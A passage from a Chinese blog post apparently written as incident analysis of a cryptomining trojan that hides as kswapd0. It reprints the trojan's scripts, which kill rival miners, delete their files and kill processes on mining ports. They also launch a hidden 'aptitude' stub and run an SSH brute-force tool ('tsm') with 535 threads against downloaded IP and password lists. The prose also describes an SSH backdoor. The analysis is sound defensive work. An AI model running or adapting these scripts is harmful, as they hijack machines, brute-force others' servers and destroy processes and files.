-f irqbnc1</span><br><span class="line">	pkill -f JnKihGjn</span><br><span class="line">	pkill -f jweri</span><br><span class="line">	pkill -f kw.sh</span><br><span class="line">	pkill -f kworker34</span><br><span class="line">	pkill -f kxjd</span><br><span class="line">	pkill -f libapache</span><br><span class="line">	pkill -f Loopback</span><br><span class="line">	pkill -f lx26</span><br><span class="line">	pkill -f mgwsl</span><br><span class="line">	pkill -f minerd</span><br><span class="line">	pkill -f minergate</span><br><span class="line">	pkill -f minexmr</span><br><span class="line">	pkill -f mixnerdx</span><br><span class="line">	pkill -f mstxmr</span><br><span class="line">	pkill -f nanoWatch</span><br><span class="line">	pkill -f nopxi</span><br><span class="line">	pkill -f NXLAi</span><br><span class="line">	pkill -f performedl</span><br><span class="line">	pkill -f polkitd</span><br><span class="line">	pkill -f pro.sh</span><br><span class="line">	pkill -f pythno</span><br><span class="line">	pkill -f qW3xT.2</span><br><span class="line">	pkill -f sourplum</span><br><span class="line">	pkill -f stratum</span><br><span class="line">	pkill -f sustes</span><br><span class="line">	pkill -f wnTKYg</span><br><span class="line">	pkill -f XbashY</span><br><span class="line">	pkill -f XJnRj</span><br><span class="line">	pkill -f xmrig</span><br><span class="line">	pkill -f xmrigDaemon</span><br><span class="line">	pkill -f xmrigMiner</span><br><span class="line">	pkill -f ysaydh</span><br><span class="line">	pkill -f zigw</span><br><span class="line">	pkill -f ld-linux</span><br><span class="line">	</span><br><span class="line">	# crond</span><br><span class="line">	ps ax | grep crond | grep -v grep | awk &#x27;&#123;print $1&#125;&#x27; &gt; /tmp/crondpid</span><br><span class="line">	while read crondpid</span><br><span class="line">	do</span><br><span class="line">		if [ $(echo  $(ps -p $crondpid -o %cpu | grep -v \%CPU) | sed -e &#x27;s/\.[0-9]*//g&#x27;)  -ge 60 ]</span><br><span class="line">		then</span><br><span class="line">			kill $crondpid</span><br><span class="line">			rm -rf /var/tmp/v3</span><br><span class="line">		fi</span><br><span class="line">	done &lt; /tmp/crondpid</span><br><span class="line">	rm /tmp/crondpid -f</span><br><span class="line">	 </span><br><span class="line">	# sshd</span><br><span class="line">	ps ax | grep sshd | grep -v grep | awk &#x27;&#123;print $1&#125;&#x27; &gt; /tmp/ssdpid</span><br><span class="line">	while read sshdpid</span><br><span class="line">	do</span><br><span class="line">		if [ $(echo  $(ps -p $sshdpid -o %cpu | grep -v \%CPU) | sed -e &#x27;s/\.[0-9]*//g&#x27;)  -ge 60 ]</span><br><span class="line">		then</span><br><span class="line">			kill $sshdpid</span><br><span class="line">		fi</span><br><span class="line">	done &lt; /tmp/ssdpid</span><br><span class="line">	rm -f /tmp/ssdpid</span><br><span class="line"></span><br><span class="line">	# syslog</span><br><span class="line">	ps ax | grep syslogs | grep -v grep | awk &#x27;&#123;print $1&#125;&#x27; &gt; /tmp/syslogspid</span><br><span class="line">	while read syslogpid</span><br><span class="line">	do</span><br><span class="line">		if [ $(echo  $(ps -p $syslogpid -o %cpu | grep -v \%CPU) | sed -e &#x27;s/\.[0-9]*//g&#x27;)  -ge 60 ]</span><br><span class="line">		then</span><br><span class="line">			kill  $syslogpid</span><br><span class="line">		fi</span><br><span class="line">	done &lt; /tmp/syslogspid</span><br><span class="line">	rm /tmp/syslogspid -f</span><br><span class="line"></span><br><span class="line">		ps x | grep &#x27;b 22&#x27;| awk &#x27;&#123;print $1,$5&#125;&#x27; &gt; .procs</span><br><span class="line"></span><br><span class="line">		cat .procs | while read line</span><br><span class="line">		do</span><br><span class="line"></span><br><span class="line">		pid=`echo $line | awk &#x27;&#123;print $1;&#125;&#x27;`</span><br><span class="line">		name=`echo $line | awk &#x27;&#123;print $2;&#125;&#x27;`</span><br><span class="line">		#echo $pid $name </span><br><span class="line"></span><br><span class="line">		if [ $(echo $name | wc -c) -lt &quot;13&quot; ]</span><br><span class="line">			then</span><br><span class="line">			echo &quot;Found&quot; $pid $name</span><br><span class="line">			kill -9 $pid</span><br><span class="line">		fi</span><br><span class="line">		done</span><br><span class="line"></span><br><span class="line">		####################################################</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		ps x | grep &#x27;d 22&#x27;| awk &#x27;&#123;print $1,$5&#125;&#x27; &gt; .procs</span><br><span class="line"></span><br><span class="line">		cat .procs | while read line</span><br><span class="line">		do</span><br><span class="line"></span><br><span class="line">		pid=`echo $line | awk &#x27;&#123;print $1;&#125;&#x27;`</span><br><span class="line">		name=`echo $line | awk &#x27;&#123;print $2;&#125;&#x27;`</span><br><span class="line">		#echo $pid $name </span><br><span class="line"></span><br><span class="line">		if [ $(echo $name | wc -c) -lt &quot;13&quot; ]</span><br><span class="line">			then</span><br><span class="line">			echo &quot;Found&quot; $pid $name</span><br><span class="line">			kill -9 $pid</span><br><span class="line">		fi</span><br><span class="line">		done</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Removing miners by known path IOC</span><br><span class="line">files()&#123;</span><br><span class="line">	rm /tmp/.cron</span><br><span class="line">	rm /tmp/Donald*</span><br><span class="line">	rm /tmp/Macron*</span><br><span class="line">	rm /tmp/.main</span><br><span class="line">	rm /tmp/.yam* -rf</span><br><span class="line">	rm -f /tmp/irq</span><br><span class="line">	rm -f /tmp/irq.sh</span><br><span class="line">	rm -f /tmp/irqbalanc1</span><br><span class="line">	rm -rf /boot/grub/deamon &amp;&amp; rm -rf /boot/grub/disk_genius</span><br><span class="line">	rm -rf /tmp/*httpd.conf</span><br><span class="line">	rm -rf /tmp/*httpd.conf*</span><br><span class="line">	rm -rf /tmp/*index_bak*</span><br><span class="line">	rm -rf /tmp/.systemd-private-*</span><br><span class="line">	rm -rf /tmp/.xm*</span><br><span class="line">	rm -rf /tmp/a7b104c270</span><br><span class="line">	rm -rf /tmp/conn</span><br><span class="line">	rm -rf /tmp/conns</span><br><span class="line">	rm -rf /tmp/httpd.conf</span><br><span class="line">	rm -rf /tmp/java*</span><br><span class="line">	rm -rf /tmp/kworkerds /bin/kworkerds /bin/config.json /var/tmp/kworkerds /var/tmp/config.json /usr/local/lib/libjdk.so</span><br><span class="line">	rm -rf /tmp/qW3xT.2 /tmp/ddgs.3013 /tmp/ddgs.3012 /tmp/wnTKYg /tmp/2t3ik</span><br><span class="line">	rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache</span><br><span class="line">	rm -rf /tmp/xm*</span><br><span class="line">	rm -rf /var/tmp/java*</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Killing and blocking miners by network related IOC</span><br><span class="line">network()&#123;</span><br><span class="line">	# Kill by known ports/IPs</span><br><span class="line">	netstat -anp | grep 69.28.55.86:443 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep 185.71.65.238 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep 140.82.52.87 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep 119.9.76.107 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :443 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :23 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :443 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :143 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :2222 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :3333 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :3389 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :4444 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :5555 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :6666 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :6665 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :6667 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :7777 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :8444 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :3347 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :14444 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :14433 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">	netstat -anp | grep :13531 |awk &#x27;&#123;print $7&#125;&#x27;| awk -F&#x27;[/]&#x27; &#x27;&#123;print $1&#125;&#x27; | xargs kill -9</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">files</span><br><span class="line">processes</span><br><span class="line">network</span><br><span class="line">echo &quot;DONE&quot;</span><br></pre></td></tr></table></figure>

<p><strong>然后判断平台类型，如果是”i686”就执行anacron，anacron是基于xmrig2.14修改的linux平台挖矿木马；如果是x86_64就启动.&#x2F;kswapd0。</strong></p>
<p><strong>然后执行dota&#x2F;.rsync&#x2F;b&#x2F;a，b&#x2F;a最终执行ps，ps是上面讲的ssh后门服务端，方便黑客远程免密ssh登录。</strong></p>
<p><strong>接着执行c目录的start，联网下载要爆破的服务器地址，端口，以及一些字典。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">pwd &gt; dir.dir</span><br><span class="line">dir=$(cat dir.dir)</span><br><span class="line">cd $dir</span><br><span class="line">chmod 777 *</span><br><span class="line">rm -rf n</span><br><span class="line">echo &quot;1&quot;&gt;n</span><br><span class="line"></span><br><span class="line">echo &quot;#!/bin/sh</span><br><span class="line">cd $dir</span><br><span class="line">./run &amp;&gt;/dev/null&quot; &gt; aptitude</span><br><span class="line">chmod u+x aptitude</span><br><span class="line">chmod 777 *</span><br><span class="line">./aptitude &gt;&gt; /dev/null &amp;</span><br><span class="line"></span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<p><strong>一直追下去，发现在go脚本中启动了tsm脚本，执行目录下的tsm传入要爆破的IP和字典</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">dir=`pwd`</span><br><span class="line">cd $dir</span><br><span class="line"></span><br><span class="line">threads=535</span><br><span class="line"></span><br><span class="line">ARCH=`uname -m`</span><br><span class="line">if [[ &quot;$ARCH&quot; =~ ^arm ]]; then</span><br><span class="line">	threads=75</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		while :</span><br><span class="line">		do</span><br><span class="line">		touch v</span><br><span class="line">		rm -rf p</span><br><span class="line">		rm -rf ip</span><br><span class="line">		rm -rf xtr*</span><br><span class="line">		rm -rf a a.*</span><br><span class="line">		rm -rf b b.*</span><br><span class="line">		</span><br><span class="line">		sleep $[ ( $RANDOM % 30 )  + 1 ]s</span><br><span class="line">		timeout 9h ./tsm -t $threads -f 1 -s 12 -S 9 -p 0 -d 1 p ip</span><br><span class="line"></span><br><span class="line">		sleep 3</span><br><span class="line">		rm -rf xtr*</span><br><span class="line">		rm -rf ip</span><br><span class="line">		rm -rf p</span><br><span class="line">		rm -rf .out</span><br><span class="line">		rm -rf /tmp/t*</span><br><span class="line">		done</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<p><strong>tsm脚本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">SCRIPT_PATH=$(dirname $(readlink -f $0))</span><br><span class="line">ARCH=`uname -m`</span><br><span class="line">if [ &quot;$ARCH&quot; == &quot;i686&quot; ]; then</span><br><span class="line">	$SCRIPT_PATH/lib/32/tsm --library-path $SCRIPT_PATH/lib/32/ $SCRIPT_PATH/tsm32 $*</span><br><span class="line">elif [ &quot;$ARCH&quot; == &quot;x86_64&quot; ];   then		</span><br><span class="line">	$SCRIPT_PATH/lib/64/tsm --library-path $SCRIPT_PATH/lib/64/ $SCRIPT_PATH/tsm64 $*</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<br>
# 参考
[腾讯官方分析 https://www.freebuf.com/articles/network/205384.html](https://www.freebuf.com/articles/network/205384.html)
[问题排查https://cloud.tencent.com/document/product/296/9604](https://cloud.tencent.com/document/product/296/9604)
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">CJ</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/05/06/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/%E4%BC%AA%E8%A3%85%E4%B8%BAkswapd0%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/">http://example.com/2023/05/06/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/%E4%BC%AA%E8%A3%85%E4%B8%BAkswapd0%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Hexo</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/05/06/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/V2ray%E8%B7%AF%E7%94%B1%E8%AE%BE%E7%BD%AE/" title="V2ray路由设置"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">V2ray路由设置</div></div></a></div><div class="next-post pull-right"><a href="/2023/05/06/%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81/Ranger%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/" title="Ranger权限管理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Ranger权限管理</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">CJ</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">419</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">38</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%B5%B7%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">一、起因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%8E%92%E6%9F%A5"><span class="toc-number">2.</span> <span class="toc-text">二、排查</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E9%A6%96%E5%85%88%E6%9F%A5%E8%AF%A2CPU%E5%8D%A0%E7%94%A8%E6%9C%80%E5%A4%9A%E7%9A%843%E4%B8%AA%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 首先查询CPU占用最多的3个进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E6%8E%92%E6%9F%A5kswapd0%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 排查kswapd0进程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4netstat-antlp-grep-kswapd0-%E6%9F%A5%E8%AF%A2%E8%AF%A5%E8%BF%9B%E7%A8%8B%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 执行命令netstat -antlp | grep kswapd0 查询该进程的网络信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-4-1-%E6%9F%A5%E7%9C%8B-x2F-home-x2F-cj-x2F-configrc-x2F-a-x2F-%E7%9B%AE%E5%BD%95"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">2.2.4.1 查看 &#x2F;home&#x2F;cj&#x2F;.configrc&#x2F;a&#x2F; 目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-4-2-%E6%9F%A5%E7%9C%8B-x2F-home-x2F-cj-x2F-configrc-x2F-b-x2F-%E7%9B%AE%E5%BD%95"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">2.2.4.2 查看 &#x2F;home&#x2F;cj&#x2F;.configrc&#x2F;b&#x2F; 目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E5%90%AF%E5%8A%A8%E7%9A%84%E6%89%80%E6%9C%89%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">木马启动的所有进程</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/06/MySQL/%E6%B3%A8%E8%A7%A3@Select%E5%92%8C@Insert/" title="注解@Select和@Insert">注解@Select和@Insert</a><time datetime="2023-05-06T05:48:28.906Z" title="发表于 2023-05-06 13:48:28">2023-05-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/06/%E5%90%8E%E7%AB%AF%E6%A1%86%E6%9E%B6/%E6%B3%A8%E8%A7%A3@EnableAutoConfiguration/" title="注解@EnableAutoConfiguration">注解@EnableAutoConfiguration</a><time datetime="2023-05-06T05:48:06.027Z" title="发表于 2023-05-06 13:48:06">2023-05-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/06/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A6%BB%E7%BA%BF/%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%9B%86%E7%BE%A4%E7%9B%91%E6%8E%A7%E6%A1%86%E6%9E%B6/" title="大数据集群监控框架">大数据集群监控框架</a><time datetime="2023-05-06T05:42:56.298Z" title="发表于 2023-05-06 13:42:56">2023-05-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/06/%E9%AB%98%E5%B9%B6%E5%8F%91/HashMap%E5%B9%B6%E5%8F%91%E9%97%AE%E9%A2%98%E5%8F%8AConcurrentHashMap%E5%8E%9F%E7%90%86/" title="HashMap并发问题及ConcurrentHashMap原理">HashMap并发问题及ConcurrentHashMap原理</a><time datetime="2023-05-06T05:31:21.103Z" title="发表于 2023-05-06 13:31:21">2023-05-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/06/%E9%AB%98%E5%B9%B6%E5%8F%91/Stream%E5%8E%9F%E7%90%86/" title="Stream原理">Stream原理</a><time datetime="2023-05-06T05:31:21.103Z" title="发表于 2023-05-06 13:31:21">2023-05-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By CJ</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>